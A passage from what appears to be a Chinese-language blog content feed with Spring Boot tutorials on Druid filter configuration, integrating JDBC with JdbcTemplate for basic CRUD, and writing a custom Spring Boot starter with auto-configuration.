class="hljs-string">&quot;*.js,*.css,/druid/*,/jdbc/*&quot;</span>);<br>    bean.setInitParameters(initParams);<br>    <span class="hljs-comment">//&quot;/*&quot; 表示过滤所有请求  </span><br>    bean.setUrlPatterns(Arrays.asList(<span class="hljs-string">&quot;/*&quot;</span>));  <br>    <span class="hljs-keyword">return</span> bean;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>平时在工作中，按需求进行配置即可，主要用作监控！</p>]]></content>
    
    
    <categories>
      
      <category>Spring Boot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Springboot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>整合和整理IDEA</title>
    <link href="/2021/04/12/SpringBoot/%E6%95%B4%E5%90%88%E5%92%8C%E6%95%B4%E7%90%86IDEA/"/>
    <url>/2021/04/12/SpringBoot/%E6%95%B4%E5%90%88%E5%92%8C%E6%95%B4%E7%90%86IDEA/</url>
    
    <content type="html"><![CDATA[<h1 id="SpringData简介"><a href="#SpringData简介" class="headerlink" title="SpringData简介"></a>SpringData简介</h1><h2 id="启动依赖"><a href="#启动依赖" class="headerlink" title="启动依赖"></a>启动依赖</h2><p>对于数据访问层，无论是 SQL(关系型数据库) 还是 NOSQL(非关系型数据库)，Spring Boot 底层都是采用 Spring Data 的方式进行统一处理。</p><p>Spring Boot 底层都是采用 Spring Data 的方式进行统一处理各种数据库，Spring Data 也是 Spring 中与 Spring Boot、Spring Cloud 等齐名的知名项目。</p><p>Sping Data 官网：<a href="https://spring.io/projects/spring-data">https://spring.io/projects/spring-data</a></p><p>数据库相关的启动器 ：可以参考官方文档：</p><p><a href="https://docs.spring.io/spring-boot/docs/2.2.5.RELEASE/reference/htmlsingle/#using-boot-starter">https://docs.spring.io/spring-boot/docs/2.2.5.RELEASE/reference/htmlsingle/#using-boot-starter</a></p><p>整合JDBC</p><h2 id="创建测试项目测试数据源"><a href="#创建测试项目测试数据源" class="headerlink" title="创建测试项目测试数据源"></a>创建测试项目测试数据源</h2><p>1、我去新建一个项目测试：springboot-data-jdbc ; 引入相应的模块！基础模块</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7LYLicOHVGnwu7ibGvbwXibYeuW0A5wz8gu4q4AMoBCoYic2Juyiate9VBZe4S0sgkCZVFV2lD6quLKVZw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>2、项目建好之后，发现自动帮我们导入了如下的启动器：</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span> <br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-jdbc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>   <br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>   <br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>3、编写yaml配置文件连接数据库；</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span>  <br>    <span class="hljs-attr">datasource:</span>   <br>    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>    <br>    <span class="hljs-attr">password:</span> <span class="hljs-number">123456</span>    <br>    <span class="hljs-comment">#?serverTimezone=UTC解决时区的报错    </span><br>    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/springboot?serverTimezone=UTC&amp;useUnicode=true&amp;characterEncoding=utf-8</span>    <br>    <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.cj.jdbc.Driver</span><br></code></pre></div></td></tr></table></figure><p>4、配置完这一些东西后，我们就可以直接去使用了，因为SpringBoot已经默认帮我们进行了自动配置；去测试类测试一下</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@SpringBootTestclass</span> SpringbootDataJdbcApplicationTests &#123;<br>    <span class="hljs-comment">//DI注入数据源    </span><br>    <span class="hljs-meta">@Autowired</span>    <br>    DataSource dataSource;<br>    <span class="hljs-meta">@Test</span>   <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">contextLoads</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException </span>&#123;    <br>        <span class="hljs-comment">//看一下默认数据源      </span><br>        System.out.println(dataSource.getClass());     <br>        <span class="hljs-comment">//获得连接     </span><br>        Connection connection =   dataSource.getConnection();      <br>        System.out.println(connection);        <br>        <span class="hljs-comment">//关闭连接        </span><br>        connection.close();    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>结果：我们可以看到他默认给我们配置的数据源为 : class com.zaxxer.hikari.HikariDataSource ， 我们并没有手动配置</p><p>我们来全局搜索一下，找到数据源的所有自动配置都在 ：DataSourceAutoConfiguration文件：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Import(    &#123;Hikari.class, Tomcat.class, Dbcp2.class, Generic.class, DataSourceJmxConfiguration.class&#125;)</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PooledDataSourceConfiguration</span> </span>&#123;    <br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">PooledDataSourceConfiguration</span><span class="hljs-params">()</span> </span>&#123; <br>    <br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这里导入的类都在 DataSourceConfiguration 配置类下，可以看出 Spring Boot 2.2.5 默认使用HikariDataSource 数据源，而以前版本，如 Spring Boot 1.5 默认使用 org.apache.tomcat.jdbc.pool.DataSource 作为数据源；</p><p><strong>HikariDataSource 号称 Java WEB 当前速度最快的数据源，相比于传统的 C3P0 、DBCP、Tomcat jdbc 等连接池更加优秀；</strong></p><p><strong>可以使用 spring.datasource.type 指定自定义的数据源类型，值为 要使用的连接池实现的完全限定名。</strong></p><p>关于数据源我们并不做介绍，有了数据库连接，显然就可以 CRUD 操作数据库了。但是我们需要先了解一个对象 JdbcTemplate</p><h2 id="JDBCTemplate"><a href="#JDBCTemplate" class="headerlink" title="JDBCTemplate"></a>JDBCTemplate</h2><p>1、有了数据源(com.zaxxer.hikari.HikariDataSource)，然后可以拿到数据库连接(java.sql.Connection)，有了连接，就可以使用原生的 JDBC 语句来操作数据库；</p><p>2、即使不使用第三方第数据库操作框架，如 MyBatis等，Spring 本身也对原生的JDBC 做了轻量级的封装，即JdbcTemplate。</p><p>3、数据库操作的所有 CRUD 方法都在 JdbcTemplate 中。</p><p>4、Spring Boot 不仅提供了默认的数据源，同时默认已经配置好了 JdbcTemplate 放在了容器中，程序员只需自己注入即可使用</p><p>5、JdbcTemplate 的自动配置是依赖 org.springframework.boot.autoconfigure.jdbc 包下的 JdbcTemplateConfiguration 类</p><p><strong>JdbcTemplate主要提供以下几类方法：</strong></p><ul><li>execute方法：可以用于执行任何SQL语句，一般用于执行DDL语句；</li><li>update方法及batchUpdate方法：update方法用于执行新增、修改、删除等语句；batchUpdate方法用于执行批处理相关语句；</li><li>query方法及queryForXXX方法：用于执行查询相关语句；</li><li>call方法：用于执行存储过程、函数相关语句。</li></ul><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>编写一个Controller，注入 jdbcTemplate，编写测试方法进行访问测试；</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.controller;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.jdbc.core.JdbcTemplate;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.PathVariable;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> java.util.Date;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/jdbc&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JdbcController</span> </span>&#123;<br>    <span class="hljs-comment">/**    </span><br><span class="hljs-comment">    * Spring Boot 默认提供了数据源，默认提供了 org.springframework.jdbc.core.JdbcTemplate   </span><br><span class="hljs-comment">    * JdbcTemplate 中会自己注入数据源，用于简化 JDBC操作    </span><br><span class="hljs-comment">    * 还能避免一些常见的错误,使用起来也不用再自己来关闭数据库连接    </span><br><span class="hljs-comment">    */</span>    <br>    <span class="hljs-meta">@Autowired</span>    <br>    JdbcTemplate jdbcTemplate;<br>    <span class="hljs-comment">//查询employee表中所有数据   </span><br>    <span class="hljs-comment">//List 中的1个 Map 对应数据库的 1行数据  </span><br>    <span class="hljs-comment">//Map 中的 key 对应数据库的字段名，value 对应数据库的字段值  </span><br>    <span class="hljs-meta">@GetMapping(&quot;/list&quot;)</span>    <br>    <span class="hljs-keyword">public</span> List&lt;Map&lt;String, Object&gt;&gt; userList()&#123;     <br>        String sql = <span class="hljs-string">&quot;select * from employee&quot;</span>;     <br>        List&lt;Map&lt;String, Object&gt;&gt; maps = jdbcTemplate.queryForList(sql);     <br>        <span class="hljs-keyword">return</span> maps; <br>    &#125;        <br>    <span class="hljs-comment">//新增一个用户    </span><br>    <span class="hljs-meta">@GetMapping(&quot;/add&quot;)</span>    <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">addUser</span><span class="hljs-params">()</span></span>&#123;    <br>        <span class="hljs-comment">//插入语句，注意时间问题 </span><br>        String sql = <span class="hljs-string">&quot;insert into employee(last_name, email,gender,department,birth)&quot;</span> +                <span class="hljs-string">&quot; values (&#x27;狂神说&#x27;,&#x27;24736743@qq.com&#x27;,1,101,&#x27;&quot;</span>+ <span class="hljs-keyword">new</span> Date().toLocaleString() +<span class="hljs-string">&quot;&#x27;)&quot;</span>;   <br>        jdbcTemplate.update(sql);       <br>        <span class="hljs-comment">//查询       </span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;addOk&quot;</span>; <br>    &#125;<br>    <span class="hljs-comment">//修改用户信息  </span><br>    <span class="hljs-meta">@GetMapping(&quot;/update/&#123;id&#125;&quot;)</span>   <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">updateUser</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;id&quot;)</span> <span class="hljs-keyword">int</span> id)</span></span>&#123;      <br>        <span class="hljs-comment">//插入语句       </span><br>        String sql = <span class="hljs-string">&quot;update employee set last_name=?,email=? where id=&quot;</span>+id;    <br>        <span class="hljs-comment">//数据     </span><br>        Object[] objects = <span class="hljs-keyword">new</span> Object[<span class="hljs-number">2</span>];       <br>        objects[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;秦疆&quot;</span>;    <br>        objects[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;24736743@sina.com&quot;</span>;     <br>        jdbcTemplate.update(sql,objects);      <br>        <span class="hljs-comment">//查询       </span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;updateOk&quot;</span>;  <br>    &#125;<br>    <span class="hljs-comment">//删除用户</span><br>    <span class="hljs-meta">@GetMapping(&quot;/delete/&#123;id&#125;&quot;)</span>    <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">delUser</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;id&quot;)</span> <span class="hljs-keyword">int</span> id)</span></span>&#123;  <br>        <span class="hljs-comment">//插入语句     </span><br>        String sql = <span class="hljs-string">&quot;delete from employee where id=?&quot;</span>;        <br>        jdbcTemplate.update(sql,id);     <br>        <span class="hljs-comment">//查询      </span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;deleteOk&quot;</span>;  <br>    &#125;   <br>&#125;<br></code></pre></div></td></tr></table></figure><p>测试请求，结果正常；</p><p>到此，CURD的基本操作，使用 JDBC 就搞定了。</p>]]></content>
    
    
    <categories>
      
      <category>Spring Boot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Springboot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>自定义start</title>
    <link href="/2021/04/11/SpringBoot/%E8%87%AA%E5%AE%9A%E4%B9%89start/"/>
    <url>/2021/04/11/SpringBoot/%E8%87%AA%E5%AE%9A%E4%B9%89start/</url>
    
    <content type="html"><![CDATA[<p>我们分析完毕了源码以及自动装配的过程，我们可以尝试自定义一个启动器来玩玩！</p><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>启动器模块是一个 空 jar 文件，仅提供辅助性依赖管理，这些依赖可能用于自动装配或者其他类库；</p><p><strong>命名归约：</strong></p><p>官方命名：</p><ul><li>前缀：spring-boot-starter-xxx</li><li>比如：spring-boot-starter-web….</li></ul><p>自定义命名：</p><ul><li>xxx-spring-boot-starter</li><li>比如：mybatis-spring-boot-starter</li></ul><h2 id="编写启动器"><a href="#编写启动器" class="headerlink" title="编写启动器"></a>编写启动器</h2><p>1、在IDEA中新建一个空项目 spring-boot-starter-diy</p><p>2、新建一个普通Maven模块：kuang-spring-boot-starter</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IPEXZtUAUBhnSZvUmrPzbD3ibDQhiaQib3L94Y8joxBzUfegDicVpSamYoysTZ54lMp3oXw0cprPIPQA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>3、新建一个Springboot模块：kuang-spring-boot-starter-autoconfigure</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IPEXZtUAUBhnSZvUmrPzbDhebhQQvGxRRLX8FezGo8Qk3bGEQElY6K2SqeDazGUZ6XqLDMvq6RDA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>4、点击apply即可，基本结构</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IPEXZtUAUBhnSZvUmrPzbDTPIzxXJqk27EGiaIBJtSpic5NcibXFX2eHXMxezmURLbibFXahiaFk5uW4A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>5、在我们的 starter 中 导入  autoconfigure 的依赖！</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 启动器 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>    <br>    <span class="hljs-comment">&lt;!--  引入自动配置模块 --&gt;</span>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.kuang<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>kuang-spring-boot-starter-autoconfigure<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>     <br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>   <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>6、将 autoconfigure 项目下多余的文件都删掉，Pom中只留下一个 starter，这是所有的启动器基本配置！</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IPEXZtUAUBhnSZvUmrPzbDNLrzEP3HC2HYHicHmmLGian64wdOw3wiauDttoUbQLMdX4XcFV2HqyVvw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>7、我们编写一个自己的服务</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloService</span> </span>&#123;<br>    HelloProperties helloProperties;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> HelloProperties <span class="hljs-title">getHelloProperties</span><span class="hljs-params">()</span> </span>&#123;    <br>        <span class="hljs-keyword">return</span> helloProperties;  <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setHelloProperties</span><span class="hljs-params">(HelloProperties helloProperties)</span> </span>&#123;       <br>        <span class="hljs-keyword">this</span>.helloProperties = helloProperties; <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">sayHello</span><span class="hljs-params">(String name)</span></span>&#123;    <br>        <span class="hljs-keyword">return</span> helloProperties.getPrefix() + name + helloProperties.getSuffix();    <br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>8、编写HelloProperties 配置类</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang;<br><span class="hljs-keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;<br><span class="hljs-comment">// 前缀 kuang.hello</span><br><span class="hljs-meta">@ConfigurationProperties(prefix = &quot;kuang.hello&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloProperties</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String prefix;   <br>    <span class="hljs-keyword">private</span> String suffix;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPrefix</span><span class="hljs-params">()</span> </span>&#123;  <br>        <span class="hljs-keyword">return</span> prefix;   <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setPrefix</span><span class="hljs-params">(String prefix)</span> </span>&#123;    <br>        <span class="hljs-keyword">this</span>.prefix = prefix;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getSuffix</span><span class="hljs-params">()</span> </span>&#123;     <br>        <span class="hljs-keyword">return</span> suffix;   <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setSuffix</span><span class="hljs-params">(String suffix)</span> </span>&#123;   <br>        <span class="hljs-keyword">this</span>.suffix = suffix; <br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>9、编写我们的自动配置类并注入bean，测试！</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.condition.ConditionalOnWebApplication;<span class="hljs-keyword">import</span> org.springframework.boot.context.properties.EnableConfigurationProperties;<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><span class="hljs-meta">@Configuration</span><span class="hljs-meta">@ConditionalOnWebApplication</span> <br><span class="hljs-comment">//web应用生效</span><br><span class="hljs-meta">@EnableConfigurationProperties(HelloProperties.class)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloServiceAutoConfiguration</span> </span>&#123;<br>    <span class="hljs-meta">@Autowired</span>    <br>    HelloProperties helloProperties;<br>    <span class="hljs-meta">@Bean</span>    <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> HelloService <span class="hljs-title">helloService</span><span class="hljs-params">()</span></span>&#123;     <br>        HelloService service = <span class="hljs-keyword">new</span> HelloService();       <br>        service.setHelloProperties(helloProperties);     <br>        <span class="hljs-keyword">return</span> service;   <br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>10、在resources编写一个自己的 META-INF\spring.factories</p><figure class="highlight properties"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs properties"><span class="hljs-comment"># Auto </span><br><span class="hljs-meta">Configureorg.springframework.boot.autoconfigure.EnableAutoConfiguration</span>=<span class="hljs-string">\com.kuang.HelloServiceAutoConfiguration</span><br></code></pre></div></td></tr></table></figure><p>11、编写完成后，可以安装到maven仓库中！</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IPEXZtUAUBhnSZvUmrPzbDmUxYwOTicxVZGSRD3H93l6SLJCEDGXiaxpO6ciaicUbwiaA9FmJiaQhnhicTw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h2 id="新建项目测试我们自己写的启动器"><a href="#新建项目测试我们自己写的启动器" class="headerlink" title="新建项目测试我们自己写的启动器"></a>新建项目测试我们自己写的启动器</h2><p>1、新建一个SpringBoot 项目</p><p>2、导入我们自己写的启动器</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.kuang<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>   <br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>kuang-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>   <br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>3、编写一个 HelloController  进行测试我们自己的写的接口！</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.controller;<br><span class="hljs-meta">@RestControllerpublic</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloController</span> </span>&#123;<br>    <span class="hljs-meta">@Autowired</span>    <br>    HelloService helloService;<br>    <span class="hljs-meta">@RequestMapping(&quot;/hello&quot;)</span>  <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">hello</span><span class="hljs-params">()</span></span>&#123;    <br>        <span class="hljs-keyword">return</span> helloService.sayHello(<span class="hljs-string">&quot;zxc&quot;</span>);  <br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>4、编写配置文件 application.properties</p><figure class="highlight properties"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs properties"><span class="hljs-meta">kuang.hello.prefix</span>=<span class="hljs-string">&quot;ppp&quot;kuang.hello.suffix=&quot;sss&quot;</span><br></code></pre></div></td></tr></table></figure><p>5、启动项目进行测试，结果成功 !</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IPEXZtUAUBhnSZvUmrPzbDTCQ0YaF3yVM8icJ1jKJ6frZibJuegdk4FwEfOUbia4tBABndicA9kV1efg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><strong>小狂神温馨提示：学完的东西一定要多下去实践！</strong></p>]]></content>
    
    
    <categories>
      
      <category>Spring Boot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Springboot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>自动配置原理</title>
